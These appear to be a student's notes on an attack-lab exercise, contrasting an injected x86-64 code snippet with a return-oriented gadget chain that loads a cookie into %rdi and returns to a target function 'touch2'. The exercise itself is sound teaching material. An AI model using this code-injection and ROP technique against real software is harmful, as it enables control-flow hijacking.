# what we do before is:
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret

# now we use gadget to do it:
...
# here we put the addr of touch2
movq %rax %rdi
ret             # to touch2
...
# here we put cookie
popq %rax
ret             # to movq %rax %rdi

